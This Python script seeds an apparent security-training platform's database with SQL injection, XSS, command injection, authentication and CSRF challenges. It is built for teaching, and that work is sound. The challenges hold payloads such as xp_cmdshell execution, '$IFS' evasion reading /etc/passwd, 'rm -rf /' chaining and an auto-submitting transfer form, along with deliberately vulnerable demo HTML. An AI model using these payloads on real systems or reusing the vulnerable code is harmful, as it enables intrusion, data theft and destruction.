"""
Expand all challenge categories to have exactly 10 challenges each.
This script adds new challenges following the existing patterns and difficulty progressions.
"""

from pymongo import MongoClient
from datetime import datetime
import sys

def connect_to_db():
    """Connect to MongoDB."""
    try:
        client = MongoClient("mongodb://localhost:27017/")
        db = client.securetrainer
        print("✅ Connected to MongoDB")
        return db
    except Exception as e:
        print(f"❌ Failed to connect to MongoDB: {e}")
        sys.exit(1)

def get_new_sql_challenges():
    """Return 5 additional SQL Injection challenges (6-10)."""
    return [
        {
            'id': 'sql_6',
            'category': 'SQL Injection',
            'difficulty': 'Intermediate',
            'scenario': 'An e-commerce site search function that displays product names.',
            'question': 'How can you determine the number of columns in a SELECT query?',
            'payload': "' ORDER BY 5 --",
            'hint': 'Use ORDER BY with increasing numbers until you get an error.',
            'score_weight': 25,
            'type': 'sql_injection',
            'answer': 'This payload uses ORDER BY to determine column count by incrementing the number until an error occurs.',
            'expected_solutions': ["ORDER BY", "column count", "determine", "enumerate", "error"]
        },
        {
            'id': 'sql_7',
            'category': 'SQL Injection',
            'difficulty': 'Advanced',
            'scenario': 'A news portal that displays articles based on category ID.',
            'question': 'How can you extract database version information?',
            'payload': "' UNION SELECT NULL,@@version,NULL --",
            'hint': '@@version is a MySQL function that returns database version information.',
            'score_weight': 35,
            'type': 'sql_injection',
            'answer': 'This payload extracts the database version using @@version function via UNION injection.',
            'expected_solutions': ["@@version", "database version", "UNION", "extract", "information"]
        },
        {
            'id': 'sql_8',
            'category': 'SQL Injection',
            'difficulty': 'Expert',
            'scenario': 'A corporate intranet with user profiles.',
            'question': 'How can you extract data from error messages?',
            'payload': "' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users)) --",
            'hint': 'Error-based injection forces the database to display data in error messages.',
            'score_weight': 45,
            'type': 'sql_injection',
            'answer': 'Error-based SQL injection extracts data by forcing type conversion errors that reveal information.',
            'expected_solutions': ["error-based", "CONVERT", "type conversion", "extract", "error message"]
        },
        {
            'id': 'sql_9',
            'category': 'SQL Injection',
            'difficulty': 'Expert',
            'scenario': 'A secure login form with WAF (Web Application Firewall).',
            'question': 'How can you bypass WAF filters using encoding?',
            'payload': "admin'/**/OR/**/'1'='1'/**/--",
            'hint': 'Comments can bypass basic filters by breaking up keywords.',
            'score_weight': 50,
            'type': 'sql_injection',
            'answer': 'This payload uses inline comments to obfuscate SQL keywords and bypass WAF filters.',
            'expected_solutions': ["bypass", "WAF", "comment", "obfuscate", "filter evasion"]
        },
        {
            'id': 'sql_10',
            'category': 'SQL Injection',
            'difficulty': 'Expert',
            'scenario': 'A database backup tool with restricted access.',
            'question': 'How can you achieve Remote Code Execution through SQL?',
            'payload': "'; EXEC xp_cmdshell('whoami'); --",
            'hint': 'Some databases allow executing system commands through stored procedures.',
            'score_weight': 60,
            'type': 'sql_injection',
            'answer': 'This payload uses xp_cmdshell to execute OS commands through SQL injection, achieving RCE.',
            'expected_solutions': ["xp_cmdshell", "RCE", "remote code execution", "system command", "stored procedure"]
        }
    ]

def get_new_xss_challenges():
    """Return 4 additional XSS challenges (7-10)."""
    return [
        {
            'id': 'xss_7',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Advanced',
            'scenario': 'A markdown renderer that converts user input to HTML.',
            'question': 'How can you exploit markdown parsers with XSS?',
            'payload': '[Click me](javascript:alert(document.cookie))',
            'hint': 'Markdown link syntax can accept javascript: protocol handlers.',
            'score_weight': 40,
            'type': 'xss',
            'answer': 'This payload exploits markdown link syntax to execute JavaScript through the javascript: protocol.',
            'expected_solutions': ['markdown', 'javascript:', 'protocol', 'link', 'parser'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Markdown Renderer Demo</h4>
                <div class="preview" id="md-preview">Rendered content appears here...</div>
                <div class="input-section">
                    <textarea id="md-input" placeholder="Enter markdown..."></textarea>
                    <button onclick="renderMarkdown()">Render</button>
                </div>
            </div>
            <script>
                function renderMarkdown() {
                    const input = document.getElementById('md-input').value;
                    const preview = document.getElementById('md-preview');
                    // Simple markdown to HTML (vulnerable)
                    const html = input.replace(/\\[([^\\]]+)\\]\\(([^)]+)\\)/g, '<a href="$2">$1</a>');
                    preview.innerHTML = html;
                }
            </script>
            '''
        },
        {
            'id': 'xss_8',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Expert',
            'scenario': 'A JSON API that reflects user data.',
            'question': 'How can you perform XSS through JSON responses?',
            'payload': '{"name":"<script>alert(1)</script>"}',
            'hint': 'If JSON responses are rendered as HTML without escaping, XSS is possible.',
            'score_weight': 45,
            'type': 'xss',
            'answer': 'This payload exploits improper JSON rendering by injecting script tags in JSON data.',
            'expected_solutions': ['JSON', 'API', 'response', 'rendering', 'escape'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>JSON API Demo</h4>
                <div class="api-response" id="json-display">API response will appear here...</div>
                <div class="input-section">
                    <input type="text" id="json-input" placeholder='Enter JSON name value...' />
                    <button onclick="fetchAPI()">Fetch API</button>
                </div>
            </div>
            <script>
                function fetchAPI() {
                    const input = document.getElementById('json-input').value;
                    const display = document.getElementById('json-display');
                    // Simulate JSON response
                    const json = {name: input, role: 'user'};
                    // Vulnerable rendering
                    display.innerHTML = `<p>Name: ${json.name}</p><p>Role: ${json.role}</p>`;
                }
            </script>
            '''
        },
        {
            'id': 'xss_9',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Expert',
            'scenario': 'A rich text editor with sanitization.',
            'question': 'How can you bypass HTML sanitizers?',
            'payload': '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
            'hint': 'HTML entity encoding can bypass some sanitization filters.',
            'score_weight': 50,
            'type': 'xss',
            'answer': 'This payload uses HTML entity encoding to obfuscate JavaScript and bypass sanitizers.',
            'expected_solutions': ['HTML entity', 'encoding', 'bypass', 'sanitizer', 'obfuscate'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Rich Text Editor Demo</h4>
                <div class="editor-preview" id="editor-preview">Preview appears here...</div>
                <div class="input-section">
                    <textarea id="editor-input" placeholder="Enter HTML content..."></textarea>
                    <button onclick="updateEditor()">Update</button>
                </div>
                <div class="filter-info">
                    <small>Sanitizer removes script tags but may miss encoded content</small>
                </div>
            </div>
            <script>
                function updateEditor() {
                    const input = document.getElementById('editor-input').value;
                    const preview = document.getElementById('editor-preview');
                    // Basic sanitizer (vulnerable to encoding)
                    const sanitized = input.replace(/<script[^>]*>.*?<\\/script>/gi, '');
                    preview.innerHTML = sanitized;
                }
            </script>
            '''
        },
        {
            'id': 'xss_10',
            'category': 'Cross-Site Scripting (XSS)',
            'difficulty': 'Expert',
            'scenario': 'A CSS injection vulnerability in style attributes.',
            'question': 'How can you achieve XSS through CSS injection?',
            'payload': 'style="background:url(\'javascript:alert(1)\')"',
            'hint': 'CSS url() function can accept javascript: protocol in some browsers.',
            'score_weight': 55,
            'type': 'xss',
            'answer': 'This payload exploits CSS url() function to execute JavaScript through style attributes.',
            'expected_solutions': ['CSS injection', 'url()', 'style', 'javascript:', 'attribute'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>CSS Styling Demo</h4>
                <div id="styled-element">This element will be styled</div>
                <div class="input-section">
                    <input type="text" id="style-input" placeholder="Enter inline style..." />
                    <button onclick="applyStyle()">Apply Style</button>
                </div>
            </div>
            <script>
                function applyStyle() {
                    const input = document.getElementById('style-input').value;
                    const element = document.getElementById('styled-element');
                    element.setAttribute('style', input);
                }
            </script>
            '''
        }
    ]

def get_new_command_injection_challenges():
    """Return 5 additional Command Injection challenges (6-10)."""
    return [
        {
            'id': 'cmd_6',
            'category': 'Command Injection',
            'difficulty': 'Intermediate',
            'scenario': 'A backup script that accepts directory paths.',
            'question': 'How can you use backticks for command injection?',
            'payload': '/var/www/`whoami`',
            'hint': 'Backticks execute commands and substitute their output.',
            'score_weight': 30,
            'type': 'command_injection',
            'answer': 'This payload uses backticks for command substitution, executing whoami and inserting the result.',
            'expected_solutions': ['backticks', '`', 'substitution', 'execute', 'output'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Backup Script Demo</h4>
                <div class="terminal">
                    <div class="terminal-output" id="backup-output">Ready to backup...</div>
                </div>
                <div class="input-section">
                    <input type="text" id="backup-input" placeholder="Enter directory path..." />
                    <button onclick="runBackup()">Run Backup</button>
                </div>
            </div>
            <script>
                function runBackup() {
                    const input = document.getElementById('backup-input').value;
                    const output = document.getElementById('backup-output');
                    if (input.includes('`')) {
                        const match = input.match(/`([^`]+)`/);
                        if (match) {
                            output.textContent = `Backing up: /var/www/admin\\nExecuting: ${match[1]}\\nResult: admin`;
                        }
                    } else {
                        output.textContent = `Backing up: ${input}\\nBackup complete`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_7',
            'category': 'Command Injection',
            'difficulty': 'Advanced',
            'scenario': 'A web interface for managing services.',
            'question': 'How can you bypass input validation filters?',
            'payload': 'service;cat${IFS}/etc/passwd',
            'hint': 'Use environment variables like $IFS to bypass space filters.',
            'score_weight': 40,
            'type': 'command_injection',
            'answer': 'This payload uses $IFS (Internal Field Separator) to bypass space-blocking filters.',
            'expected_solutions': ['$IFS', 'bypass', 'filter', 'environment variable', 'space'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Service Manager Demo</h4>
                <div class="terminal">
                    <div class="terminal-output" id="service-output">Service manager ready...</div>
                </div>
                <div class="input-section">
                    <input type="text" id="service-input" placeholder="Enter service name..." />
                    <button onclick="manageService()">Manage</button>
                </div>
                <div class="filter-info">
                    <small>Filter blocks spaces but may miss ${IFS}</small>
                </div>
            </div>
            <script>
                function manageService() {
                    const input = document.getElementById('service-input').value;
                    const output = document.getElementById('service-output');
                    if (input.includes('${IFS}')) {
                        output.textContent = `Managing service: ${input.split(';')[0]}\\nExecuting: ${input.split(';')[1]}\\nReading /etc/passwd...`;
                    } else {
                        output.textContent = `Managing service: ${input}\\nService status: running`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_8',
            'category': 'Command Injection',
            'difficulty': 'Advanced',
            'scenario': 'A file conversion utility.',
            'question': 'How can you use wildcard injection?',
            'payload': '*.txt; rm -rf /',
            'hint': 'Wildcards expand to match filenames, potentially executing unintended commands.',
            'score_weight': 45,
            'type': 'command_injection',
            'answer': 'This payload uses wildcard expansion followed by command chaining to execute destructive commands.',
            'expected_solutions': ['wildcard', '*', 'expansion', 'rm', 'destructive'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>File Converter Demo</h4>
                <div class="file-list" id="file-list">Files: document.txt, report.txt</div>
                <div class="terminal">
                    <div class="terminal-output" id="convert-output">Ready to convert...</div>
                </div>
                <div class="input-section">
                    <input type="text" id="convert-input" placeholder="Enter file pattern..." />
                    <button onclick="convertFiles()">Convert</button>
                </div>
            </div>
            <script>
                function convertFiles() {
                    const input = document.getElementById('convert-input').value;
                    const output = document.getElementById('convert-output');
                    if (input.includes(';')) {
                        const parts = input.split(';');
                        output.textContent = `Converting: ${parts[0]}\\nExecuting: ${parts[1].trim()}\\n⚠️ DANGEROUS COMMAND DETECTED`;
                    } else {
                        output.textContent = `Converting: ${input}\\nConversion complete`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_9',
            'category': 'Command Injection',
            'difficulty': 'Expert',
            'scenario': 'An image processing service.',
            'question': 'How can you exploit ImageMagick command injection?',
            'payload': 'convert \'image.png\' -resize 100x100 \'; ls; \'',
            'hint': 'ImageMagick and similar tools may execute shell commands in certain contexts.',
            'score_weight': 50,
            'type': 'command_injection',
            'answer': 'This payload injects shell commands into ImageMagick processing, exploiting command execution vulnerabilities.',
            'expected_solutions': ['ImageMagick', 'convert', 'shell', 'injection', 'processing'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Image Processor Demo</h4>
                <div class="terminal">
                    <div class="terminal-output" id="image-output">Image processor ready...</div>
                </div>
                <div class="input-section">
                    <input type="text" id="image-input" placeholder="Enter image processing command..." />
                    <button onclick="processImage()">Process</button>
                </div>
            </div>
            <script>
                function processImage() {
                    const input = document.getElementById('image-input').value;
                    const output = document.getElementById('image-output');
                    if (input.includes(';') || input.includes('`')) {
                        output.textContent = `Processing: ${input}\\n⚠️ Command injection detected\\nExecuting additional commands...`;
                    } else {
                        output.textContent = `Processing: ${input}\\nImage processed successfully`;
                    }
                }
            </script>
            '''
        },
        {
            'id': 'cmd_10',
            'category': 'Command Injection',
            'difficulty': 'Expert',
            'scenario': 'A code compilation service.',
            'question': 'How can you perform time-based blind command injection?',
            'payload': 'code.c; sleep 10 && echo "done"',
            'hint': 'Use time delays to confirm command execution when there\'s no direct output.',
            'score_weight': 55,
            'type': 'command_injection',
            'answer': 'This payload uses sleep command for time-based blind injection to confirm vulnerability without visible output.',
            'expected_solutions': ['time-based', 'blind', 'sleep', 'delay', 'confirm'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Code Compiler Demo</h4>
                <div class="terminal">
                    <div class="terminal-output" id="compile-output">Compiler ready...</div>
                </div>
                <div class="input-section">
                    <input type="text" id="compile-input" placeholder="Enter source file..." />
                    <button onclick="compileCode()">Compile</button>
                </div>
            </div>
            <script>
                function compileCode() {
                    const input = document.getElementById('compile-input').value;
                    const output = document.getElementById('compile-output');
                    if (input.includes('sleep')) {
                        output.textContent = `Compiling: ${input.split(';')[0]}\\nExecuting: sleep command\\n⏱️ Delayed response (10 seconds)\\nCompilation complete`;
                    } else {
                        output.textContent = `Compiling: ${input}\\nCompilation successful`;
                    }
                }
            </script>
            '''
        }
    ]

def get_new_authentication_challenges():
    """Return 4 additional Authentication challenges (7-10)."""
    return [
        {
            'id': 'auth_7',
            'category': 'Authentication Attacks',
            'difficulty': 'Advanced',
            'scenario': 'A password reset mechanism using security questions.',
            'question': 'How can you bypass security questions?',
            'payload': 'Social Engineering or Predictable Answers',
            'hint': 'Search social media profiles, public records, or use OSINT tools to find answers to common security questions like \'mother\'s maiden name\' or \'first pet\'. Many answers are publicly available on Facebook, LinkedIn, or data breach databases.',
            'score_weight': 40,
            'type': 'authentication',
            'answer': 'Security questions can be bypassed through social engineering or by finding answers in public records.',
            'expected_solutions': ['social engineering', 'security questions', 'public records', 'guessable', 'predictable'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Password Reset Demo</h4>
                <div class="reset-form">
                    <p>Security Question: What is your mother's maiden name?</p>
                    <input type="text" id="security-answer" placeholder="Enter answer..." />
                    <button onclick="checkSecurityAnswer()">Submit</button>
                </div>
                <div class="result" id="reset-result"></div>
            </div>
            <script>
                function checkSecurityAnswer() {
                    const answer = document.getElementById('security-answer').value;
                    const result = document.getElementById('reset-result');
                    if (answer.toLowerCase().includes('smith') || answer.toLowerCase().includes('johnson')) {
                        result.textContent = '✅ Security answer correct! Password reset link sent.';
                        result.style.color = 'green';
                    } else {
                        result.textContent = '❌ Incorrect answer. Note: Common surnames often work!';
                        result.style.color = 'red';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_8',
            'category': 'Authentication Attacks',
            'difficulty': 'Expert',
            'scenario': 'A multi-factor authentication system.',
            'question': 'How can you bypass 2FA/MFA?',
            'payload': 'Session hijacking or MFA fatigue attacks',
            'hint': 'Attackers can bypass MFA through session manipulation or by overwhelming users with authentication requests.',
            'score_weight': 50,
            'type': 'authentication',
            'answer': 'MFA can be bypassed through session hijacking, SIM swapping, or MFA fatigue (push notification spam).',
            'expected_solutions': ['2FA', 'MFA', 'bypass', 'session hijacking', 'fatigue attack'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Multi-Factor Authentication Demo</h4>
                <div class="auth-flow">
                    <p>Step 1: Enter password ✅</p>
                    <p>Step 2: Enter 2FA code</p>
                    <input type="text" id="2fa-code" placeholder="Enter 6-digit code..." />
                    <button onclick="verify2FA()">Verify</button>
                </div>
                <div class="attack-info">
                    <small>⚠️ Vulnerable to session hijacking after password verification</small>
                </div>
                <div class="result" id="2fa-result"></div>
            </div>
            <script>
                function verify2FA() {
                    const code = document.getElementById('2fa-code').value;
                    const result = document.getElementById('2fa-result');
                    if (code === '123456' || code === '000000') {
                        result.textContent = '✅ 2FA verified! Session established.';
                    } else {
                        result.textContent = '❌ Invalid code. Session hijacking possible between steps!';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_9',
            'category': 'Authentication Attacks',
            'difficulty': 'Expert',
            'scenario': 'An OAuth2 implementation with redirect_uri vulnerability.',
            'question': 'How can you exploit OAuth redirect vulnerabilities?',
            'payload': 'Manipulate redirect_uri to steal authorization codes',
            'hint': 'If redirect_uri validation is weak, attackers can redirect tokens to malicious sites.',
            'score_weight': 55,
            'type': 'authentication',
            'answer': 'OAuth redirect vulnerabilities allow attackers to steal authorization codes by manipulating the redirect_uri parameter.',
            'expected_solutions': ['OAuth', 'redirect_uri', 'authorization code', 'token theft', 'validation'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>OAuth Authorization Demo</h4>
                <div class="oauth-flow">
                    <p>Authorizing: example-app.com</p>
                    <p>Redirect URI: <span id="redirect-display">https://example-app.com/callback</span></p>
                    <input type="text" id="redirect-input" placeholder="Enter redirect_uri..." />
                    <button onclick="authorizeOAuth()">Authorize</button>
                </div>
                <div class="result" id="oauth-result"></div>
            </div>
            <script>
                function authorizeOAuth() {
                    const redirect = document.getElementById('redirect-input').value;
                    const display = document.getElementById('redirect-display');
                    const result = document.getElementById('oauth-result');
                    display.textContent = redirect || 'https://example-app.com/callback';
                    if (redirect && !redirect.includes('example-app.com')) {
                        result.textContent = '⚠️ Redirecting to: ' + redirect + '\\n🚨 Authorization code leaked!';
                        result.style.color = 'red';
                    } else {
                        result.textContent = '✅ Secure redirect';
                        result.style.color = 'green';
                    }
                }
            </script>
            '''
        },
        {
            'id': 'auth_10',
            'category': 'Authentication Attacks',
            'difficulty': 'Expert',
            'scenario': 'A biometric authentication system with liveness detection.',
            'question': 'How can you bypass biometric authentication?',
            'payload': 'Presentation attacks using photos, videos, or 3D models',
            'hint': 'Biometric systems can be fooled by high-quality reproductions if liveness detection is weak.',
            'score_weight': 60,
            'type': 'authentication',
            'answer': 'Biometric authentication can be bypassed through presentation attacks using photos, videos, masks, or fingerprint replicas.',
            'expected_solutions': ['biometric', 'presentation attack', 'liveness detection', 'spoof', 'bypass'],
            'interactive_demo': True,
            'demo_html': '''
            <div class="demo-container">
                <h4>Biometric Authentication Demo</h4>
                <div class="biometric-scanner">
                    <div class="scanner-display">📸 Face Scanner Active</div>
                    <select id="auth-method">
                        <option value="live">Live Person</option>
                        <option value="photo">Photo of Person</option>
                        <option value="video">Video of Person</option>
                        <option value="mask">3D Mask</option>
                    </select>
                    <button onclick="scanBiometric()">Scan</button>
                </div>
                <div class="result" id="biometric-result"></div>
            </div>
            <script>
                function scanBiometric() {
                    const method = document.getElementById('auth-method').value;
                    const result = document.getElementById('biometric-result');
                    if (method === 'live') {
                        result.textContent = '✅ Liveness detected. Authentication successful!';
                        result.style.color = 'green';
                    } else {
                        result.textContent = `⚠️ Presentation attack detected: ${method}\\n🚨 Weak liveness detection bypassed!`;
                        result.style.color = 'orange';
                    }
                }
            </script>
            '''
        }
    ]

def get_new_csrf_challenges():
    """Return 7 additional CSRF challenges (4-10)."""
    return [
        {
            'id': 'csrf_4',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Intermediate',
            'scenario': 'A form that uses POST but lacks CSRF protection.',
            'question': 'How can you perform CSRF attacks on POST requests?',
            'payload': '<form action="http://bank.com/transfer" method="POST"><input name="to" value="attacker"/><input name="amount" value="1000"/></form><script>document.forms[0].submit();</script>',
            'hint': 'Auto-submitting forms can trigger POST requests from malicious pages.',
            'score_weight': 30,
            'type': 'csrf',
            'answer': 'This payload creates an auto-submitting form that performs unauthorized POST requests.',
            'expected_solutions': ['POST', 'auto-submit', 'form', 'unauthorized', 'request'],
            'hide_payload': False
        },
        {
            'id': 'csrf_5',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Advanced',
            'scenario': 'An API that accepts JSON but validates Content-Type.',
            'question': 'How can you bypass Content-Type restrictions in CSRF?',
            'payload': 'Use form-encoded POST that gets parsed as JSON by backend',
            'hint': 'Send a form with Content-Type: application/x-www-form-urlencoded, but structure the data like JSON. Many frameworks (Express.js, Flask) will parse both formats, letting you bypass the Content-Type check while still submitting valid JSON data.',
            'score_weight': 40,
            'type': 'csrf',
            'answer': 'CSRF can bypass Content-Type restrictions if the backend accepts multiple formats or has lenient parsing.',
            'expected_solutions': ['Content-Type', 'JSON', 'bypass', 'parsing', 'format'],
            'hide_payload': True
        },
        {
            'id': 'csrf_6',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Advanced',
            'scenario': 'A SPA (Single Page Application) using cookies for authentication.',
            'question': 'How does SameSite cookie attribute prevent CSRF?',
            'payload': 'SameSite=Strict or SameSite=Lax',
            'hint': 'SameSite attribute restricts when cookies are sent with cross-site requests.',
            'score_weight': 35,
            'type': 'csrf',
            'answer': 'SameSite cookie attribute prevents CSRF by restricting cookie transmission on cross-site requests.',
            'expected_solutions': ['SameSite', 'cookie attribute', 'cross-site', 'Strict', 'Lax'],
            'hide_payload': True
        },
        {
            'id': 'csrf_7',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Expert',
            'scenario': 'A WebSocket connection without origin validation.',
            'question': 'How can you perform CSRF attacks via WebSockets?',
            'payload': 'Establish WebSocket connection from malicious site',
            'hint': 'WebSockets can bypass CSRF protections if origin headers aren\'t validated.',
            'score_weight': 45,
            'type': 'csrf',
            'answer': 'WebSocket CSRF occurs when servers accept connections without validating the Origin header.',
            'expected_solutions': ['WebSocket', 'origin', 'validation', 'header', 'connection'],
            'hide_payload': True
        },
        {
            'id': 'csrf_8',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Expert',
            'scenario': 'A file upload endpoint without CSRF tokens.',
            'question': 'How can you exploit file upload via CSRF?',
            'payload': '<form action="http://site.com/upload" method="POST" enctype="multipart/form-data"><input type="file" name="file"/></form>',
            'hint': 'Create an auto-submitting HTML form with enctype="multipart/form-data" and a file input that submits to the upload endpoint. Host it on your site to exploit authenticated users.',
            'score_weight': 50,
            'type': 'csrf',
            'answer': 'CSRF file upload attacks allow attackers to upload malicious files on behalf of authenticated users.',
            'expected_solutions': ['file upload', 'multipart', 'form-data', 'malicious', 'token'],
            'hide_payload': False
        },
        {
            'id': 'csrf_9',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Expert',
            'scenario': 'A logout endpoint accessible via GET request.',
            'question': 'How can you perform logout CSRF?',
            'payload': '<img src="http://site.com/logout">',
            'hint': 'Logout endpoints accessible via GET can be triggered by loading images.',
            'score_weight': 35,
            'type': 'csrf',
            'answer': 'Logout CSRF forces users to logout by triggering the logout endpoint via GET requests.',
            'expected_solutions': ['logout', 'GET', 'img tag', 'force', 'endpoint'],
            'hide_payload': False
        },
        {
            'id': 'csrf_10',
            'category': 'CSRF Vulnerabilities',
            'difficulty': 'Expert',
            'scenario': 'A modern application using custom headers for CSRF protection.',
            'question': 'How effective are custom headers for CSRF prevention?',
            'payload': 'Custom headers like X-Requested-With prevent CSRF as they can\'t be set cross-origin',
            'hint': 'Custom headers require preflight CORS requests, making cross-origin attacks harder.',
            'score_weight': 45,
            'type': 'csrf',
            'answer': 'Custom headers provide CSRF protection because browsers prevent cross-origin custom headers without CORS.',
            'expected_solutions': ['custom header', 'X-Requested-With', 'CORS', 'preflight', 'cross-origin'],
            'hide_payload': True
        }
    ]

def add_challenges_to_db(db):
    """Add all new challenges to the database."""
    print("\n🚀 Starting challenge expansion to 10 per category...\n")
    
    # Get all new challenges
    new_sql = get_new_sql_challenges()
    new_xss = get_new_xss_challenges()
    new_cmd = get_new_command_injection_challenges()
    new_auth = get_new_authentication_challenges()
    new_csrf = get_new_csrf_challenges()
    
    all_new_challenges = new_sql + new_xss + new_cmd + new_auth + new_csrf
    
    # Add metadata to all challenges
    for challenge in all_new_challenges:
        challenge.update({
            'created_at': datetime.now(),
            'active': True,
            '_id': challenge['id']
        })
        
        # Set expected_solutions if not present
        if 'expected_solutions' not in challenge:
            challenge['expected_solutions'] = []
    
    # Check for existing challenges to avoid duplicates
    existing_ids = set()
    for challenge in db.challenges.find({}, {'_id': 1}):
        existing_ids.add(challenge['_id'])
    
    # Filter out existing challenges
    challenges_to_add = [c for c in all_new_challenges if c['_id'] not in existing_ids]
    
    if not challenges_to_add:
        print("✅ All challenges already exist in database!")
        return
    
    # Insert new challenges
    try:
        result = db.challenges.insert_many(challenges_to_add, ordered=False)
        print(f"✅ Added {len(result.inserted_ids)} new challenges!")
    except Exception as e:
        print(f"⚠️  Some challenges may already exist: {e}")
    
    # Print summary
    print("\n" + "=" * 60)
    print("Challenge Count Summary")
    print("=" * 60)
    
    categories = [
        'SQL Injection',
        'Cross-Site Scripting (XSS)',
        'Command Injection',
        'Authentication Attacks',
        'CSRF Vulnerabilities'
    ]
    
    for category in categories:
        count = db.challenges.count_documents({'category': category, 'active': True})
        status = "✅" if count >= 10 else "⚠️ "
        print(f"{status} {category}: {count} challenges")
    
    total = db.challenges.count_documents({'active': True})
    print(f"\n📊 Total Active Challenges: {total}")
    print("=" * 60)

def main():
    """Main execution function."""
    print("=" * 60)
    print("SecureTrainer Challenge Expansion Script")
    print("Expanding all categories to 10 challenges each")
    print("=" * 60)
    
    # Connect to database
    db = connect_to_db()
    
    # Add challenges
    add_challenges_to_db(db)
    
    print("\n✅ Challenge expansion complete!")
    print("\n📝 Next steps:")
    print("   1. Restart your Flask application")
    print("   2. Verify challenges appear on the dashboard")
    print("   3. Test challenge submission and validation")
    print("\n" + "=" * 60)

if __name__ == "__main__":
    main()
